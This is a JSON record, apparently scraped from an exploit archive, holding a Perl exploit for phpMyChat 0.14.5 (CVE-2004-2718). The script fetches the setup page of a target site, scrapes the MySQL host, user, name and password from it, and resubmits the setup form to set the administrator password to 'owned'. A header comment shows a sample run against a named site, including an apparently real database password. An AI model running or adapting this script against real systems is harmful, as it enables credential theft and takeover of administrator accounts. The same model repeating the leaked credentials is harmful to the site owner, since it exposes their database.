{
  "id": "703",
  "title": "phpMyChat 0.14.5 - Remote Improper File Permissions",
  "cve": "CVE-2004-2718",
  "vuln_type": "unknown",
  "code": "####################################################################\r\n#\r\n#  _____ _\r\n# |  ___| | _____      ___\r\n# | |_  | |/ _ \\ \\ /\\ / /\r\n# |  _| | | (_) \\ V  V /\r\n# |_|   |_|\\___/ \\_/\\_/\r\n#      Security Group.\r\n#\r\n#                    * phpMyChat remote sploit *                           \r\n#                           by sysbug\r\n#\r\n# C:\\Perl\\bin>perl pmc.pl www.kublooddrive.com /chat\r\n# /* Mysql dump :\r\n# * C_DB_HOST : localhost\r\n# * C_DB_NAME : jhawk_pchat1\r\n# * C_DB_USER : jhawk_pchat1\r\n# * C_DB_PASS : vvejTjeLgB\r\n# *\r\n# * Adding Admin ....\r\n# * login:jhawk\r\n# * pwd:owned\r\n# */\r\n# C:\\Perl\\bin>\r\n# \r\n# Credits: all my friends!\r\n\r\nuse IO::Socket;\r\n\r\nif(@ARGV < 2){\r\nusage();\r\n}\r\nmain();\r\nsub sock(){\r\n$ock=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>80,Proto=>'tcp',Timeout=>10)|| die \" * s0ck null -\\n\";\r\nprint $ock \"$path\\r\\n\";\r\nprint $ock \"Accept: */*\\r\\n\";\r\nprint $ock \"Accept-Language: pt\\r\\n\";\r\nprint $ock \"Accept-Encoding: gzip, deflate\\r\\n\";\r\nprint $ock \"User-Agent: l33t br0ws3r\\r\\n\";\r\nprint $ock \"Host: $host\\r\\n\";\r\nprint $ock \"Connection: Keep-Alive\\r\\n\\r\\n\\r\\n\";\r\n$path = '';\r\n}\r\nsub main(){\r\nprint \"/*\\n\";\r\nprint \" * sploit remote phpMychat\\n\";\r\nprint \" *        by sysbug\\n\";\r\nprint \" *\\n\";\r\n$host = $ARGV[0];\r\n$folder = $ARGV[1];\r\n$path = \"GET $folder/chat/setup.php3?next=1 HTTP/1.1\";\r\nsock();\r\n$result =1;\r\nwhile($recv = <$ock>){\r\nif($recv =~ /(C_DB_PASS|C_DB_USER|C_DB_NAME|C_DB_HOST)(.*)(VALUE=)(\")(.*)(\">)/){\r\n$c++;\r\nprint \" * Mysql dump :\\n\" if($result);\r\nprint \" * $1 : $5\\n\";\r\n$mysql[$c] = $5;\r\n$result = '';\r\n}\r\nelse{\r\nprint \" * sploit failed! \\n\";\r\nprint \" *\\\\ \\n\";\r\nexit;\r\n}\r\n}\r\nclose($ock);\r\n$path = \"GET $folder/chat/setup.php3?next=2&Form_Send=2&C_DB_TYPE=mysql&C_DB_HOST=$mysql[1]&C_DB_NAME=$mysql[2]&C_DB_USER=$mysql[3]&C_DB_PASS=$mysql[4]&C_MSG_TBL=messages&C_REG_TBL=reg_users&C_USR_TBL=users&C_BAN_TBL=ban_users&C_MSG_DEL=96&C_USR_DEL=4&C_REG_DEL=0&C_PUB_CHAT_ROOMS=Blood+Talk&C_PRIV_CHAT_ROOMS=&C_MULTI_LANG=1&C_LANGUAGE=english&C_REQUIRE_REGISTER=1&C_SHOW_ADMIN=1&C_SHOW_DEL_PROF=1&C_VERSION=1&C_BANISH=1&C_NO_SWEAR=1&C_SAVE=*&C_USE_SMILIES=1&C_HTML_TAGS_KEEP=simple&C_HTML_TAGS_SHOW=1&C_TMZ_OFFSET=0&C_MSG_ORDER=0&C_MSG_NB=20&C_MSG_REFRESH=10&C_SHOW_TIMESTAMP=1&C_NOTIFY=1&C_WELCOME=1 HTTP/1.1\";\r\nsock();\r\nwhile($recv = <$ock>){\r\nif($recv =~ /(ADM_LOG)(.*)(VALUE=)(\")(.*)(\">)/){\r\n$c++;\r\n$mysql[$c] = $5;\r\n}\r\n}\r\nclose($ock);\r\n$pwd=\"owned\";\r\n$path = \"GET $folder/chat/setup.php3?next=2&C_DB_TYPE=mysql&C_DB_HOST=$mysql[1]&C_DB_NAME=$mysql[2]&C_DB_USER=$mysql[3]&C_DB_PASS=$mysql[4]&C_MSG_TBL=messages&C_REG_TBL=reg_users&C_USR_TBL=users&C_BAN_TBL=ban_users&C_MSG_DEL=96&C_USR_DEL=4&C_REG_DEL=0&C_PUB_CHAT_ROOMS=Blood+Talk&C_PRIV_CHAT_ROOMS=&C_MULTI_LANG=1&C_LANGUAGE=english&C_REQUIRE_REGISTER=1&C_SHOW_ADMIN=1&C_SHOW_DEL_PROF=1&C_VERSION=1&C_BANISH=1&C_NO_SWEAR=1&C_SAVE=*&C_USE_SMILIES=1&C_HTML_TAGS_KEEP=simple&C_HTML_TAGS_SHOW=1&C_TMZ_OFFSET=0&C_MSG_ORDER=0&C_MSG_NB=20&C_MSG_REFRESH=10&C_SHOW_TIMESTAMP=1&C_NOTIFY=1&C_WELCOME=1&ADM_LOG=$mysql[5]&ADM_PASS=$pwd&Form_Send=3&Exist_Adm=1 HTTP/1.1\";\r\nsock();\r\nif($mysql[5]){\r\nprint \" *\\n * Adding Admin ....\\n * login:$mysql[5]\\n * pwd:$pwd \\n *\\\\ \\n\";\r\n}\r\nelse{\r\nprint \" * sploit failed! \\n\";\r\nprint \" *\\\\ \\n\";\r\n}\r\nclose($ock);\r\n}\r\nsub usage(){\r\nprint \"/*\\n\";\r\nprint \" * sploit remote phpMychat\\n\";\r\nprint \" *        by sysbug\\n\";\r\nprint \" * usage: perl $0 xpl.pl <host>\\n\";\r\nprint \" * example: perl $0 xpl.pl www.site.com\\n\";\r\nprint \" *          perl $0 xpl.pl www.site.com /chat\\n\";\r\nprint \" */\\n\";\r\nexit;\r\n}\r\n\r\n# milw0rm.com [2004-12-22]",
  "url": "https://www.exploit-db.com/exploits/703"
}